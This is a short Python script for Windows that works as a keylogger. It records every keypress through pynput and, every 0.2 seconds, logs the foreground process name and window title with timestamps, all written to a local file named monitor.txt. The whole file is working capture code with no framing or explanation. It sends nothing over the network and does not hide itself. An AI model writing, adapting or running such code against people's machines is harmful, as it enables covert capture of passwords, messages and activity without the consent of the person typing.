import sys, os
from pynput.keyboard import Controller,Key,Listener
from ctypes import *
from time import sleep
from datetime import datetime
from threading import Thread
 

def on_press(key):
    try:
        print("Pressing: ",format(key.char))
        f.write(format(key.char))
    except AttributeError: 
        print("Pressing: ",format(key))
        f.write(format(key))
 

def on_release(key):
    print(" ")
    f.write(" ")
 
    if key==Key.esc:
        f.close()
        return False

def start_keyhook():
    with Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()



user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi

def getProcessInfo():
    global windows
    hwnd = user32.GetForegroundWindow()
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    processId = str(pid.value)
    executable = create_string_buffer(512)
    h_process = kernel32.OpenProcess(0x400|0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
    windowTitle = create_string_buffer(512)
    user32.GetWindowTextA(hwnd, byref(windowTitle), 512)
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    windows.pop(0)
    windows.append([executable.value.decode('gbk'),windowTitle.value.decode('gbk')])



def start_window():
    global windows
    windows = [None, None]
    while True:
        getProcessInfo()
        if windows[0] != windows[1]:
            print('='*30)
            print(str(datetime.now())[:19],windows[0],'==>',windows[1])
            change_info = str(datetime.now())[:19],windows[0],'==>',windows[1]
            f.write("\n" + str(change_info) + "\n")
        sleep(0.2)
    f.close()


if __name__ == '__main__':
    file_path = os.getcwd()
    f = open(file_path + "\\" + "monitor.txt", "w")
    
    try:
        Thread(target = start_keyhook).start()
        Thread(target = start_window).start()
    except:
        print ("Error: Thread Fail")
    
    while 1:
        pass